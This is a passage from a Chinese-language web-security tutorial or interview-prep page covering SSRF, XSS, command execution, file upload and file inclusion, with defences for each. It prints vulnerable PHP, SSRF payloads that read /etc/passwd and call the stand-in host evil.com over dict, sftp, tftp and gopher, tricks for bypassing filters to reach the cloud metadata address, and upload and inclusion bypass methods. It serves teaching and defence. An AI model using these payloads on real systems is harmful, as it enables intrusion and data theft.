$img;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fsockopen()</p><pre class="line-numbers language-none"><code class="language-none">//fsockopen()函数本身就是打开一个网络连接或者Unix套接字连接&lt;?php$host=$_GET['url'];$fp = fsockopen("$host", 80, $errno, $errstr, 30);if (!$fp) {    echo "$errstr ($errno)&lt;br /&gt;\n";} else {    $out = "GET / HTTP/1.1\r\n";    $out .= "Host: $host\r\n";    $out .= "Connection: Close\r\n\r\n";    fwrite($fp, $out);    while (!feof($fp)) {        echo fgets($fp, 128);    }    fclose($fp);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>curl()</p><pre class="line-numbers language-none"><code class="language-none">//利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于curl()函数的利用方式function curl($url){      $ch = curl_init(); //  初始化curl连接句柄    curl_setopt($ch, CURLOPT_URL, $url); //设置连接URL    curl_setopt($ch, CURLOPT_HEADER, 0);  // 不输出头文件的信息    curl_exec($ch);   // 执行获取结果    curl_close($ch);  // 关闭curl连接句柄}$url = $_GET['url'];curl($url); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件</p><p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。<br>3、漏洞攻击方式</p><pre><code>对外网，服务器所在内网，本地进行端口扫描（挨个试探），获取一些服务的banner信息攻击运行在内网或本地的应用程序对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如strust2,SQli等)下载内网资源，利用file协议读取本地文件或资源等内部任意主机的任意端口发送精心构造的PayloadDOS攻击（请求大文件，始终保持连接Keep-Alive Always）进行跳板利用Redis未授权访问，HTTP CRLF注入实现getshell</code></pre><pre class="line-numbers language-none"><code class="language-none">file:///  -- 本地文件传输协议，主要用于访问本地计算机中的文件dict://   -- 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628sftp://   -- SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）ldap://   -- 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议tftp://   -- 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机gopher:// -- 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802185129898.png" alt="image-20230802185129898"></p><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p><pre><code>file:/// 从文件系统中获取文件内容，如，file:///etc/passwddict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：sftp:// SSH文件传输协议或安全文件传输协议ldap:// 轻量级目录访问协议tftp:// 简单文件传输协议gopher:// 分布式文档传递服务，可使用gopherus生成payload</code></pre><p>1、file</p><p>这种URL Schema可以尝试从文件系统中获取文件：</p><pre><code>http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></pre><p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p><p>2、dict</p><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p><pre><code>http://example.com/ssrf.php?dict://evil.com:1337/evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*]accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</code></pre><p>3、sftp</p><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><pre><code>http://example.com/ssrf.php?url=sftp://evil.com:1337/evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*]accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</code></pre><p>4、ldap://或ldaps:// 或ldapi://</p><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><pre><code>http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</code></pre><p>5、tftp://</p><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><pre><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKETevil.com:# nc -lvup 1337Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</code></pre><p>6、gopher://</p><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><pre><code>http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?&gt;evil.com:# nc -lvp 1337Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</code></pre><p><strong>六、SSRF漏洞利用（危害）</strong></p><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。.</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p><p>http:192.168.64.144/phpmyadmin/<br>file:///D:/<a href="http://www.txt/">www.txt</a><br>dict://192.168.64.144:3306/info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a><br>七、SSRF绕过方式</p><p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p><p><strong>一、常见的绕过方式</strong></p><p>1、限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</p><pre><code>可以尝试采用http基本身份认证的方式绕过如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</code></pre><p>2.采用短网址绕过</p><pre><code>比如百度短地址https://dwz.cn/</code></pre><p>3.采用进制转换</p><pre><code>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</code></pre><p>在这里插入图片描述<br>4.利用特殊域名</p><pre><code>原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1(xip.io 现在好像用不了了，可以找找其他的)</code></pre><p>5.利用[::]</p><pre><code>可以利用[::]来绕过localhosthttp://169.254.169.254&gt;&gt;http://[::169.254.169.254]</code></pre><p>6.利用句号</p><pre><code>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</code></pre><p>7、CRLF 编码绕过</p><pre><code>%0d-&gt;0x0d-&gt;\r回车%0a-&gt;0x0a-&gt;\n换行进行HTTP头部注入</code></pre><p>example.com/?url=<a href="http://eval.com%0d%0aHOST:fuzz.com%0d%0a">http://eval.com%0d%0aHOST:fuzz.com%0d%0a</a> </p><p>8.利用封闭的字母数字</p><pre><code>利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.comhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]List:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre><p><strong>二、常见限制</strong></p><p>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p><pre><code>采用http基本身份认证的方式绕过，即@http://www.xxx.com@www.xxc.com</code></pre><p>2.限制请求IP不为内网地址</p><pre><code>当不允许ip为内网地址时：（1）采取短网址绕过（2）采取特殊域名（3）采取进制转换</code></pre><p>3.限制请求只为http协议</p><pre><code>（1）采取302跳转（2）采取短地址</code></pre><p><strong>八、SSRF漏防御</strong></p><p>通常有以下5个思路：</p><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p><h2 id="一、XSS漏洞"><a href="#一、XSS漏洞" class="headerlink" title="一、XSS漏洞"></a>一、XSS漏洞</h2><p>原理：</p><p>XSS 主要使用 javascript，javascript 可以非常灵活的操作 html、css 和浏览器。 </p><p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p><p>当用户访问被 XSS 注入的网页，XSS 代码就会被提取出来 用户浏览器就会解析这段 XSS 代码，也就是说用户被攻击了  用户最简单的动作就是使用浏览器上网，并且浏览器中有 javascript 解释器， 可以解析  javascript，然而浏览器不会判断代码是否恶意。</p><p>微博、留言板、聊天室等等<strong>收集用户输入的地方</strong>， 都有遭受 XSS 的风险，只要没有对用户的输入进行严格过滤，就会被 XSS 。</p><p>XSS的种类有哪些,区别和修复方式：</p><p>种类：存储型，反射型，DOM型<br>区别：存储型:常出现在信息修改添加等地方，导致恶意代码被存储在数据库中，每当被攻击者访问到后就会触发执行；反射型：常出现在url中，一般需要攻击者提前构造好恶意链接，欺骗用户点击，触发攻击代码；DOM型：攻击代码在url中，然后输出在了浏览器的DOM节点中。简单比较会发现，存储和反射都经过服务器，而DOM是纯前端。修复：对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only，装WAF等。</p><p><strong>XSS 漏洞危害</strong></p><ul><li>盗取各种用户账号 </li><li>窃取用户 Cookie 资料，冒充用户身份进入网站 </li><li>劫持用户会话，执行任意操作 </li><li>刷流量，执行弹窗广告 </li><li>传播蠕虫病毒</li></ul><p><strong>XSS 漏洞类型</strong></p><ul><li><p>反射型 XSS</p><p>搜索框，用户登录 </p><p>非持久性、参数跨站脚本 </p><p>窃取用户 cookie 或进行钓鱼欺骗</p></li><li><p>存储型 XSS</p><p>留言板，评论，博客日志 </p><p>持久性跨站脚本，更具威胁性 </p><p>渗透网站、挂马、蠕虫病毒、钓鱼</p></li><li><p>DOM 型 XSS</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> str <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>str<span class="token operator">+</span><span class="token string">"'&gt;testLink&lt;/a&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>write<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="二、命令执行漏洞"><a href="#二、命令执行漏洞" class="headerlink" title="二、命令执行漏洞"></a>二、命令执行漏洞</h2><p>命令执行漏洞是值攻击者可以随意执行系统命令，它属于高危漏洞之一，也属于代码执行的范畴。命令执行漏洞不仅存在 B/S 架构中，还在 C/S 架构中也常常遇到。</p><p>应用有时需要调用一些执行系统命令的函数，如 PHP 的 system 、exec、shell_exec、passthru、proc_popen  等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p><strong>命令执行漏洞的危害</strong></p><ul><li>继承 web 服务程序的权限去执行系统命令或读写文件</li><li>反弹 Shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li></ul><p><strong>命令执行漏洞的原理</strong></p><p><strong>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 system、 exec、shell_exec 等，如果用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常的命令中， 造成命令执行漏洞。</strong></p><p><strong>在操作系统中，“&amp;、|、||” 都可以作为命令连接符使用， 用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，从而造成漏洞。</strong></p><p><strong>命令执行漏洞成因</strong></p><ul><li><p>代码层过滤不严格</p><p>商业应用需要执行命令，商业应用的一些核心代码可能在二进制文件当中，在 web 应用中通过 system 函数调用。例如 system (“/bin/program –arg c194a9eg&lt;!– begin-inline-katexarg”);</p></li><li><p>系统漏洞造成命令注入</p><p>例如 bash 破壳漏洞 (CVE-2014-6271)，如果我们控制执行的 bash 的环境变量，就可以通过破壳漏洞来执行任意代码。</p></li><li><p>第三方组件造成命令注入</p><p>如 Wordpress，可以选择 ImageMagick 这个常用的 图片处理组件，处理用户上传图片时造成命令执行，如 JAVA 中 Struts2/ElasticsearchGroovy 等。</p></li></ul><p><strong>命令执行漏洞常见函数</strong></p><ul><li><p>System 函数的语法是： system (string $command [, int &amp;end-inline-katex–&gt;return_var ] )</p></li><li><ul><li>同 C 版本的 system () 函数一样</li><li>本函数执行 command 参数所指定的命令，并且输出执行结果</li><li>命令执行后的返回值为输出值的最后一行</li><li>函数本身也会打印全部的输出值</li></ul></li><li><p>Exec 函数的语法为：exec (string command [, array &amp;output [, int &amp;c194a9eg&lt;!– begin-inline-katexreturn_var]] )</p></li><li><ul><li>这个函数的作用是执行 command 参数所指定的命令</li><li>命令执行后的值为输出值的最后一行</li><li>函数本身不会打印任何内容</li></ul></li><li><p>Passthru 函数的语法为：passthru (string $command [, int &amp;end-inline-katex–&gt;return_var ] )</p></li><li><ul><li>同 exec () 函数类似</li><li>passthru () 函数也是用来执行外部命令 command 的</li><li>当所执行的系统命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec () 或 system () 函数。</li></ul></li><li><p>Shell_exec 函数的语法为： shell_exec (string $cmd)</p></li><li><ul><li>cmd 是要执行的命令</li><li>String 是参数的数据类型，也就是字符串。</li><li>函数会在命令执行完成后将全部的输出值作为字符串输入返回值，本身并不打印任何信息。</li><li>Shell_exec 函数的用法同反引号形同，注意是反引号（``）而不是普通单引号（’’）。</li></ul></li></ul><p><strong>命令执行漏洞连接符</strong></p><p>&amp;: 顺序执行多条命令，而不管命令是否执行成功</p><p>&amp;&amp;: 逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令， 前面的命令执行失败，后面的命令不会执行，与 || 正好相反</p><p>|: 显示后面命令的结果</p><p>||: 逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。 前面的命令执行失败，后面的命令才会执行</p><p><strong>命令执行漏洞防御</strong></p><ul><li><p>不执行外部的应用程序或命令</p><p>尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在 执行 system、eval 等命令执行功能的函数前，要先确定参数内容。</p></li><li><p>使用 escapeshellarg 函数处理相关参数</p><p>Escapeshellarg 函数会将任何引起参数或命令结束的字符进行转义</p></li><li><p>使用 safe_mode_exec_dir 执行可执行的文件路径</p><p>将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文 件路径。</p></li></ul><h2 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h2><p><strong>文件上传和命令执行，有看过相关日志吗？</strong></p><p>文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。</p><p>对于文件上传漏洞，以下是一些可能存在的相关日志：</p><ol><li>文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息，例如上传时间、上传文件名称、上传文件大小等。</li><li>访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传时间、上传 IP 地址等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。</li></ol><p>对于命令执行漏洞，以下是一些可能存在的相关日志：</p><ol><li>访问日志：Web 服务器或应用服务器上的访问日志中可能包含恶意代码执行的信息，例如请求 URL、HTTP 请求方法、HTTP 状态码等。</li><li>异常日志：应用程序中的异常日志可以记录可能存在的恶意代码执行异常信息，例如异常类型、异常堆栈等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录恶意代码执行的详细信息，例如恶意代码的来源、执行时间、执行结果等。</li></ol><p>需要注意的是，以上只是其中一部分可能存在的相关日志，实际应用中还有更多可能的日志类型。在进行文件上传和命令执行漏洞的检测和防御时，需要根据具体应用进行评估和选择，并及时发现和修复潜在的安全威胁。</p><p><strong>你能说明文件上传的原理吗？</strong></p><ol><li>客户端向服务器发送一个包含文件数据的 POST 请求。</li><li>服务器接收请求并解析其中的文件数据。</li><li>服务器将文件保存在指定的目录下，并返回处理结果给客户端。</li></ol><p>具体来说，文件上传流程一般如下：</p><ol><li>用户在 Web 页面上选择要上传的文件，并提交表单。</li><li>浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。</li><li>Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。</li><li>服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。</li><li>如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。</li><li>服务器返回上传结果给客户端，告知用户文件是否上传成功。</li></ol><p>需要注意的是，文件上传涉及到的安全问题较多，例如上传的文件可能会包含病毒、木马等恶意程序，攻击者可能会利用上传漏洞上传恶意文件，从而导致服务器被控制。因此，在进行文件上传功能开发时，需要仔细考虑安全问题，并采取相应的防御措施，例如限制上传文件大小、过滤不安全的文件类型等。</p><hr><p><strong>文件上传攻击特征？</strong></p><p>文件上传攻击是指攻击者通过网站上的文件上传功能，上传恶意文件来执行攻击。以下是一些文件上传攻击的特征：</p><ol><li>文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。</li><li>文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。</li><li>文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。</li><li>大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。</li><li>目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。</li></ol><p>如果您担心自己的网站可能会受到文件上传攻击，请确保实施足够的安全措施，如限制上传文件类型、大小和数量、对上传的文件进行检查、将上传的文件保存在安全的位置，并为所有上传的文件生成一个唯一的文件名。</p><p><strong>文件上传加固方法？</strong></p><ol><li>文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。</li><li>检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。</li><li>重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。</li><li>存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。</li><li>使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。</li><li>HTTPS加密：在传输过程中使用HTTPS协议加密，以避免数据在传输过程中被窃听或篡改。</li><li>日志审计：记录所有的文件上传操作并定期审计日志，以便发现异常上传行为，及时采取措施。</li></ol><p>总之，防止文件上传攻击需要综合考虑多种因素，包括文件类型、大小、内容、存储位置、传输方式等，同时定期进行安全审计，并且对于应用程序代码的编写需要充分考虑安全因素。</p><p><strong>文件上传绕过方式：</strong></p><p>1- 前端JS突破：抓包修改文件名 或者 禁用当前浏览器的JS脚本</p><p>​2- 后端突破：</p><p>​2.1-黑名单：00截断、大小写、空格点、 php 1234567 、phphtml、分布式文件上传、文件流绕过….</p><p>​2.2-白名单：比较鸡肋的00截断、双文件名…</p><p>​             内存木⻢已经注入，如何查杀？</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731174417138.png" alt="image-20230731174417138"></p><h2 id="二、文件包含"><a href="#二、文件包含" class="headerlink" title="二、文件包含"></a>二、文件包含</h2><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函 数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件 包含。服务器执行 PHP 文件时，可以通过包含函数加载另一个文件中的  PHP 代码， 并且当 PHP 来执行，这会为开发者节省大量的时间。</p><p><strong>产生漏洞的原因</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    $var = $GET['page'];    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是一段 PHP 代码，从代码上分析可以看出， 把一个 GET 请求的参数 “page” 传给了一个变 量  filename，然后包含了这个变量。然而，开发者没有对 $_GET [‘page’] 参数经过严格的过滤。直接带入了 include  的函数，我们可以修改 $_GET [‘page’] 的值，包含自己想看的文件。 （文件的路径一定要对，不对的话就包含不了）</p><p>这样，我们总结一下，<strong>文件包含漏洞就是</strong>： 程序开发人员一般希望代码更灵活，所以将被<strong>包含的文件设置为变  量</strong>，用来进行<strong>动态调用</strong>，文件<strong>包含函数加载的参数</strong>没有经过<strong>过滤</strong>或者严格的<strong>定义</strong>，可以被用户控制，包含其他恶意  文件，导致了执行了<strong>非预期的代码</strong>。从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><p><strong>包含函数<em>有那些</em></strong></p><p>PHP 中文件包含函数有以下四种：</p><ul><li><p>require () 只要程序一运行就包含文件，找不到被包含的文件时会产生致命 错误，并停止脚本</p></li><li><p>require_once ()  若文件中代码已被包含则不会再次包含</p></li><li><p>include () 执行到 include 时才包含文件，找不到被包含文件时只会产生警告， 脚本将继续执行</p></li><li><p>include_once () 若文件中代码已被包含则不会再次包含</p><p><strong>文件包含漏洞利用条件</strong></p><ul><li>程序用 include () 等文件包含函数通过动态变量的范式引入需要包含的文件 </li><li>用户能够控制该动态变量 </li><li>要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</li></ul></li></ul><p><strong>文件包含漏洞的分类</strong></p><ul><li><p>本地包含</p><p>可以包含本地文件，在条件允许时甚至能执行代码 读敏感文件，读 PHP 文件包含日志文件 GetShell 包含 data: 或 php://input 等伪协议 若有 phpinfo 则可以包含临时文件 配合上传图片马，然后包含从而 GetShell</p></li><li><p>远程包含</p><p>包含远程的木马或病毒文件，从而 GetShell</p></li></ul><p>注意：要实现远程文件包含需要 allow_url_fopen 和 allow_url_include 都开启</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    $var = $GET['page'];    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在包含变量 $var 时，限制了只允许包含 “.html”  格式的文件，这就阻止了一些非法的包含其他文件的情况。</p><p><strong>文件包含绕过限制  ：</strong></p><p>绕过后面的 “. Html” 限制有很多方法可以实现</p><ol><li><p>%00 截断</p><p>就是在 url 后面输入 %00</p><p>条件： allow_url_fopen = Off php 版本 &lt; 5.3.4</p></li><li><p>长路径截断 </p><p>条件：windows OS，点号需要长于 256；linux OS 长于 4096 windows 下目录最大长度为 256 字节，超出的部分会被丢 弃 linux 下目录最大长度为 4096 字节</p></li><li><p>点点点点点号绕过</p><p>点号绕过的原理和长路径截断的一样： 原理是： windows 下目录最大长度为 256 字节， 超出的部分会被丢弃 linux 下目录最大长度为 4096 字节，  超出的部分会被丢弃 所以用….. 绕过的时候 windows 系统 中，点号需要长于 256 ；linux 系统 中点号要长于 4096</p><p><strong>开启包含功能的条件   ：</strong></p><p>想要开启文件包含的 功能， 首先要修改 PHP 的配置 文件（PHP.ini）把文件里的功能选项开启。</p><p>在 Linux 中 PHP.ini 配置文件一般默认安装 在 /etc 目 录 下 。 下面是 两 个 功 能选项 ： </p><ul><li><p>allow_url_fopen ：</p><p>on 默认 开 启 该选项 为 on 便 是 激活了 URL 形式 的 fopen 封装协议使得可以访问 URL 对 象文件等。</p></li><li><p>allow_url_include ：</p><p>off 默认关闭，该选项 为 on 便 是允许 包含 URL 对 象文件等自己有没有实操过文件上传配合文件包含漏洞？</p></li></ul></li></ol><p><strong>自己有没有实操过文件上传配合文件包含漏洞？</strong></p><p>发现一个上传文件页面，但只能上传图片。</p><p>我们可以利用火狐来绕过限制，首先设置浏览器的代理为 127.0.0.1 端口为 8080，然后打开 burp suite 工具待用 ，然后再次上传我们的木马文件，这时候 burp suite  工具会闪烁， 我们进入 burp suite 